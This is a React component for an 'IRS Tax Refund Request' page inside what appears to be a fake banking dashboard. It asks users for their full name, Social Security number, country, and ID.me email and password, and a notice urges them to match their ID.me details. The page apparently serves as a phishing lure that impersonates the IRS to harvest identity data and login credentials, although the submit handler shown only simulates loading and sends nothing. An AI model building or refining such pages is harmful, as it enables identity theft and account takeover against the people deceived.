import React, { useEffect, useMemo, useState } from "react";
import "./styles.css";
import FilingIDForm from "../../components/FilingIDForm";
import Sidebar from "../../components/Sidbar";
import DesktopHeader from "../../components/DesktopHeader";
import { useGlobalContext } from "../../../../context/context";
import countryList from "react-select-country-list";
import Select from "react-select";

const IRSContent = ({ onSubmit, loading }) => {
  const [value, setValue] = useState("");

  const options = useMemo(() => countryList().getData(), []);

  const changeHandler = (value) => {
    setValue(value);
  };
  return (
    <div className="form-container">
      <div className="form-wrapper">
        <div className="form-content">
          {/* Header with Icon */}
          <div className="form-header">
            <div className="header-icon">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              >
                <path d="M4 2v20l2-1 2 1 2-1 2 1 2-1 2 1 2-1 2 1V2l-2 1-2-1-2 1-2-1-2 1-2-1-2 1Z"></path>
                <path d="M16 8h-6a2 2 0 1 0 0 4h4a2 2 0 1 1 0 4H8"></path>
                <path d="M12 17.5v-11"></path>
              </svg>
            </div>
            <h1>IRS Tax Refund Request</h1>
            <p>
              Please fill out the form below to submit your IRS tax refund
              request
            </p>
          </div>

          {/* Form Container */}
          <div className="form-card">
            <div className="form">
              {/* Personal Information Section */}
              <div className="form-section">
                <h3 className="section-title">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path>
                    <circle cx="12" cy="7" r="4"></circle>
                  </svg>
                  Personal Information
                </h3>

                {/* Name */}
                <div className="form-group">
                  <label htmlFor="name">Full Name</label>
                  <div className="input-group">
                    <div className="input-icon">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        strokeWidth="2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                      >
                        <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path>
                        <circle cx="12" cy="7" r="4"></circle>
                      </svg>
                    </div>
                    <input
                      type="text"
                      name="name"
                      id="name"
                      required
                      placeholder="Enter your full name"
                    />
                  </div>
                </div>

                {/* SSN */}
                <div className="form-group">
                  <label htmlFor="ssn">Social Security Number (SSN)</label>
                  <div className="input-group">
                    <div className="input-icon">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        strokeWidth="2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                      >
                        <path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path>
                      </svg>
                    </div>
                    <input
                      type="text"
                      name="ssn"
                      id="ssn"
                      required
                      placeholder="XXX-XX-XXXX"
                    />
                  </div>
                </div>
              </div>

              {/* ID.me Credentials Section */}
              <div className="form-section">
                <h3 className="section-title">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <rect
                      width="18"
                      height="11"
                      x="3"
                      y="11"
                      rx="2"
                      ry="2"
                    ></rect>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                  </svg>
                  ID.me Credentials
                </h3>

                {/* ID.me Email */}
                <div className="form-group">
                  <label htmlFor="idme_email">ID.me Email</label>
                  <div className="input-group">
                    <div className="input-icon">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        strokeWidth="2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                      >
                        <path d="m22 7-8.991 5.727a2 2 0 0 1-2.009 0L2 7"></path>
                        <rect x="2" y="4" width="20" height="16" rx="2"></rect>
                      </svg>
                    </div>
                    <input
                      type="email"
                      name="idme_email"
                      id="idme_email"
                      required
                      placeholder="Enter your ID.me email"
                    />
                  </div>
                </div>

                {/* ID.me Password */}
                <div className="form-group">
                  <label htmlFor="idme_password">ID.me Password</label>
                  <div className="input-group">
                    <div className="input-icon">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        strokeWidth="2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                      >
                        <path d="m15.5 7.5 2.3 2.3a1 1 0 0 0 1.4 0l2.1-2.1a1 1 0 0 0 0-1.4L19 4"></path>
                        <path d="m21 2-9.6 9.6"></path>
                        <circle cx="7.5" cy="15.5" r="5.5"></circle>
                      </svg>
                    </div>
                    <input
                      type="password"
                      name="idme_password"
                      id="idme_password"
                      required
                      placeholder="Enter your ID.me password"
                    />
                  </div>
                </div>
              </div>

              {/* Location Information Section */}
              <div className="form-section">
                <h3 className="section-title">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <path d="M20 10c0 4.993-5.539 10.193-7.399 11.799a1 1 0 0 1-1.202 0C9.539 20.193 4 14.993 4 10a8 8 0 0 1 16 0"></path>
                    <circle cx="12" cy="10" r="3"></circle>
                  </svg>
                  Location Information
                </h3>

                {/* Country */}
                <div className="form-group">
                  <label htmlFor="country">Country</label>
                  <Select
                    options={options}
                    value={value}
                    onChange={changeHandler}
                  />
                </div>
              </div>

              {/* Important Notice */}
              <div className="notice-box">
                <div className="notice_svg_con">
                  <div className="notice-icon">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    >
                      <circle cx="12" cy="12" r="10"></circle>
                      <path d="M12 16v-4"></path>
                      <path d="M12 8h.01"></path>
                    </svg>
                  </div>
                  <h3>Important Notice</h3>
                </div>
                <div className="notice-content">
                  <p>
                    Please ensure all information provided is accurate and
                    matches your ID.me account details. Any discrepancies may
                    result in delays or rejection of your refund request.
                  </p>
                </div>
              </div>

              {/* Submit Button */}
              <div className="form-actions">
                <button
                  onClick={onSubmit}
                  type="submit"
                  className="submit-button"
                >
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <path d="M14.536 21.686a.5.5 0 0 0 .937-.024l6.5-19a.496.496 0 0 0-.635-.635l-19 6.5a.5.5 0 0 0-.024.937l7.93 3.18a2 2 0 0 1 1.112 1.11z"></path>
                    <path d="m21.854 2.147-10.94 10.939"></path>
                  </svg>
                  {loading ? "Loading..." : "Submit Request"}
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

const IRSS = () => {
  const [detailsSubmitted, setDetailsSubmitted] = useState(false);
  const [loading, setLoading] = useState(false);
  const handleSubmit = (data) => {
    setLoading(true);
    setTimeout(() => {
      setDetailsSubmitted(true);
      setLoading(false);
    }, 2000);
  };
  return (
    <>
      {detailsSubmitted ? (
        <FilingIDForm />
      ) : (
        <IRSContent onSubmit={handleSubmit} loading={loading} />
      )}
    </>
  );
};

const IRS = () => {
  const user = JSON.parse(sessionStorage.getItem("user"));
  const token = JSON.parse(sessionStorage.getItem("userToken"));
  const _id = user._id;
  const {
    getUserWithdrawals,
    getTotalBalance,
    getKYC,
    getUser,
    getAllDeposits,
    getAllLoans,
  } = useGlobalContext();
  useEffect(() => {
    getUserWithdrawals(token, _id);
    getUser(token, _id);
    getTotalBalance(_id, token);
    getKYC(token, _id);
    getAllDeposits(token, _id);
    getAllLoans(token, _id);
  }, []);
  return (
    <>
      <div className="bank_dashbaord">
        <IRSS />
      </div>
      <div className="bank_desktop_dashboard">
        <Sidebar />
        <div className="bank_desktop_dashboard_body">
          <DesktopHeader />
          <IRSS />
        </div>
      </div>
    </>
  );
};

export default IRS;
